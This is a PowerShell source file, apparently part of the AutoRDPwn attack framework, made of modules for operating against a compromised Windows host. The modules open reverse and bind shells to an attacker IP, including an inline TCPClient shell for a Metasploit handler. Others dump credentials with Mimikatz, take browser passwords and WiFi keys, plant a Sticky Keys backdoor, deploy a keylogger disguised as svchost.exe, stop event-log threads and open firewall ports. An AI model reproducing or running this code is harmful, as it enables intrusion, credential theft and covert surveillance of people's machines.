if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPortProxyPorts = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { $script:ARModuleFiles = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPersistenceItems = New-Object System.Collections.Generic.List[object] }

function Reset-AROperatorPortProxies {
    if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { return }
    $records = @($script:ARPortProxyPorts.ToArray())
    if ($records.Count -eq 0) { return }
    foreach ($record in $records) {
        $listenPort = [string]$record
        $listenAddress = '0.0.0.0'
        $separator = $listenPort.IndexOf('|')
        if ($separator -ge 0) {
            $listenAddress = $listenPort.Substring($separator + 1)
            $listenPort = $listenPort.Substring(0, $separator)
        }
        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
        if ([string]::IsNullOrWhiteSpace($listenAddress)) { $listenAddress = '0.0.0.0' }
        try {
            & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=$listenAddress" 2>&1> $null
            if ($LASTEXITCODE -ne 0 -and $listenAddress -ne '0.0.0.0') {
                & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=0.0.0.0" 2>&1> $null
            }
            if ($LASTEXITCODE -ne 0) { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
        }
        catch { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
    }
    $script:ARPortProxyPorts.Clear()
}

function Remove-ARModuleArtifacts {
    if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { return }
    $paths = @($script:ARModuleFiles.ToArray())
    if ($paths.Count -eq 0) { return }
    try {
        if (Test-ARIsLocalTarget) {
            foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
        }
        elseif ($script:ARSession) {
            Invoke-Command -Session $script:ARSession -ArgumentList $paths -ScriptBlock {
                param($items)
                foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
            } -ErrorAction Stop | Out-Null
        }
    }
    catch { Write-ARWarn ('Module artifact cleanup incomplete: ' + $_.Exception.Message) }
    finally { $script:ARModuleFiles.Clear() }

    # WMI subscriptions, run values and logon tasks do not live in the file
    # list above, so the persistence ledger rides out through the same gate:
    # entries recorded this session (and leftover shapes from interrupted
    # runs) are deleted while the target session is still open, before
    # Invoke-ARCleanup closes it.
    if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) {
        $persistedItems = @($script:ARPersistenceItems.ToArray())
        if ($persistedItems.Count -gt 0) {
            $null = Remove-ARPersistenceItems -Items $persistedItems -IncludeUnknown
        }
        $script:ARPersistenceItems.Clear()
    }
}

function Invoke-ARModulePipeShell {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
    Write-ARInfo 'Named pipe server started on the target.'
    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
    Set-ARStatus 'Named pipe shell closed' 'Ok'
}

function Invoke-ARModuleWinRsConsole {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $arguments = @("/r:$target")
    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
    & winrs.exe @arguments
    Set-ARStatus 'WinRS console closed' 'Ok'
}

function Invoke-ARModuleHttpRevShell {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($data, $address, $listenPort)
            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
            . ([scriptblock]::Create($source))
            Invoke-WebRev -ip $address -port $listenPort
        } -ArgumentList $encoded, $ip, $port | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
            param($data, $address, $listenPort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($payload, $remoteAddress, $remotePort)
                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
                . ([scriptblock]::Create($source))
                Invoke-WebRev -ip $remoteAddress -port $remotePort
            } -ArgumentList $payload, $address, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
    $server = Join-Path $script:ARTools 'server.exe'
    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
    & $server $ip $port
    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
}

function Invoke-ARModuleNetcatDirect {
    $target = Get-ARTargetComputer
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $listenPort)
            . $path
            Invoke-PowerShellTcp -Bind -Port $listenPort
        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
            param($path, $listenPort)
            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $localPort)
                . $script
                Invoke-PowerShellTcp -Bind -Port $localPort
            } -ArgumentList $path, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Remote Control Application'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
}

function Invoke-ARModuleNetcatReverse {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $address, $remotePort)
            . $path
            Start-Sleep -Seconds 5
            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
            param($path, $address, $remotePort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $remoteAddress, $targetPort)
                . $script
                Start-Sleep -Seconds 5
                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
            } -ArgumentList $path, $address, $remotePort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
    Set-ARStatus 'Reverse connection scheduled' 'Ok'
}

function Invoke-ARModuleMimikatzSam {
    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
    Show-ARText $result
    Set-ARStatus 'SAM dump finished' 'Ok'
}

function Invoke-ARModuleMimikatzLogon {
    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
    Show-ARText $result
    Set-ARStatus 'Logon password dump finished' 'Ok'
}

function Invoke-ARModuleSharpWeb {
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
    Show-ARText $result
    Set-ARStatus 'Browser password recovery finished' 'Ok'
}

function Invoke-ARModuleWifiKeys {
    $result = Invoke-ARTargetCommand -ScriptBlock {
        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
        try {
            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
            $lines = New-Object System.Collections.Generic.List[string]
            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                try {
                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
                    $name = [string]$xml.WLANProfile.name
                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
                } catch { }
            }
            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
            return ($lines -join "`n")
        }
        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Show-ARText $result
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARModulePortScan {
    $target = Get-ARTargetComputer
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
    if ($ports -notmatch '^\d+$') { $ports = '100' }
    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'Continue'
    try {
        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
    }
    finally { $ProgressPreference = $oldProgress }
    Set-ARStatus 'Port scan finished' 'Ok'
}

function Invoke-ARModulePortForward {
    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
    if (Test-ARIsLocalTarget) {
        $scriptBlock = {
            param($action, $lport, $lhost, $rport, $rhost)
            switch ($action) {
                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
                'show' { & netsh.exe interface portproxy show all }
                'reset' { & netsh.exe interface portproxy reset }
            }
        }
        if ($operation -eq '1' -or $operation -eq '2') {
            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
            & $scriptBlock 'add' $lport $lhost $rport $rhost
            $proxyRecord = $lport + '|' + $lhost
            if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        }
        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
        else { & $scriptBlock 'show' }
        Set-ARStatus 'Port forwarding updated' 'Ok'
        return
    }
    if ($operation -eq '1') {
        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        $proxyRecord = $lport + '|' + $lhost
        if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        Set-ARStatus 'Local port forwarding created' 'Ok'
        return
    }
    $parameters = @{}
    if ($operation -eq '2') {
        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        Invoke-ARTargetCommand -ScriptBlock {
            param($lport, $lhost, $rport, $rhost)
            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding created' 'Ok'
    }
    elseif ($operation -eq '4') {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding reset' 'Ok'
    }
    else {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding listed' 'Ok'
    }
}

function Invoke-ARModuleWebServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Start-WebServer -BINDING 'http://+:8080/'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Start-WebServer -BINDING 'http://+:8080/'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Web Server'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    $url = 'http://' + $target + ':8080/'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
    Write-Host $url -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try { Start-Process $url | Out-Null } catch { }
    Set-ARStatus 'Web server started' 'Ok'
}

function Invoke-ARModuleCredScan {
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
    $method = $method.ToLowerInvariant()
    if ($method -like 'pass*' -or $method -like 'contra*') {
        $plain = Read-ARSecret 'Password'
        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
        $hash = Get-NTLM $plain
    }
    else {
        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
    }
    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
    Set-ARStatus 'Credential scan finished' 'Ok'
}

function Invoke-ARModuleRdpCaching {
    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
    if (-not $script:ARModuleFiles.Contains($recovered)) { $script:ARModuleFiles.Add($recovered) }
    Write-ARSuccess ('Recovered images: ' + $recovered)
    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
    if (-not $script:ARInvokedFromOption) {
        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
    }
    Set-ARStatus 'RDP cache rebuilt' 'Ok'
}

function Invoke-ARModuleListUsers {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
    Show-ARText $result
    Set-ARStatus 'User enumeration finished' 'Ok'
}

function Invoke-ARModuleSessionGopher {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
    Show-ARText $result
    Set-ARStatus 'SessionGopher finished' 'Ok'
}

function Invoke-ARModuleStickyKeys {
    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
    Invoke-ARTargetCommand -ScriptBlock {
        $keys = @('sethc.exe', 'Utilman.exe')
        foreach ($key in $keys) {
            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
            New-Item -Path $path -Force | Out-Null
            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
        }
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
    } | Out-Null
    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
}

function Invoke-ARModuleMetasploit {
    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
    $template = @'
$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
'@
    $payload = $template -f $msfHost, $msfPort
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
            param($code)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
    Write-Host 'use exploit/multi/handler'
    Write-Host 'set payload windows/shell/reverse_tcp'
    Write-Host ('set LHOST ' + $msfHost)
    Write-Host ('set LPORT ' + $msfPort)
    Write-Host 'exploit'
    Set-ARStatus 'Metasploit payload started' 'Ok'
}

function Invoke-ARModuleKeylogger {
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHost = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHost, $second)
    if (Test-ARIsLocalTarget) {
        $dll = $localDll
        $hostProcess = $localHost
        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
        Push-Location $work
        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
        Start-Sleep -Milliseconds 500
        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
        $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
        Copy-ARFileToTarget -LocalPath $localDll -RemotePath $remoteDll | Out-Null
        Copy-ARFileToTarget -LocalPath $localHost -RemotePath $remoteHost | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $logPath = Invoke-Command -Session $session -ArgumentList $remoteDll, $remoteHost -ScriptBlock {
            param($dll, $hostProcess)
            Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            $log = Join-Path $env:LOCALAPPDATA 'config.dat'
            Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
            Push-Location (Split-Path -Parent $dll)
            try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
            return $log
        } -ErrorAction Stop
        if (-not $script:ARModuleFiles.Contains([string]$logPath)) { $script:ARModuleFiles.Add([string]$logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try {
            Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
                param($path)
                Get-Content -LiteralPath $path -Wait
            } | ForEach-Object { Write-Host $_ }
        }
        finally {
            try {
                Invoke-Command -Session $session -ArgumentList $remoteHost -ScriptBlock {
                    param($hostProcess)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    Set-ARStatus 'Keylogger stopped' 'Ok'
}

function Invoke-ARModuleChachi {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Chachi-Enumerator.ps1' -Function 'Comprueba-Todo'
    Show-ARText $result
    Set-ARStatus 'Enumeration finished' 'Ok'
}

function Invoke-ARModuleSherlock {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Sherlock.ps1' -Function 'Find-AllVulns'
    Show-ARText $result
    Set-ARStatus 'Sherlock finished' 'Ok'
}

function Invoke-ARModulePrivescCheck {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-PrivescCheck.ps1' -Function 'Invoke-PrivescCheck'
    Show-ARText $result
    Set-ARStatus 'Privilege escalation audit finished' 'Ok'
}

function Invoke-ARModulePhant0m {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Phant0m.ps1' -Function 'Invoke-Phant0m'
    Show-ARText $result
    Set-ARStatus 'Event log threads stopped' 'Ok'
}

# Screen access runs over the target-side JPEG frame server and its pull viewer.
# The old route staged a 1.7 MB VNC vendor blob and injected it reflectively;
# that injection dies silently after the GetProcAddress fix, so it is retired.
function Invoke-ARModuleVncServer {
    Invoke-ARAttackQuickScreen
}

function Invoke-ARModuleExternalScript {
    $source = Read-ARValue (Get-ARText 'txt73' 'Enter the path or url of the script')
    $function = Read-ARLineValue (' ' + (Get-ARText 'txt74' 'Write the function you want to execute') + ' [none]: ')
    if ($null -eq $function) { $function = '' } else { $function = $function.Trim() }
    if ($source -match '^https?://') {
        $work = New-ARWorkDirectory
        $localScript = Join-Path $work 'external.ps1'
        Invoke-ARDownload -Url $source -OutFile $localScript
    }
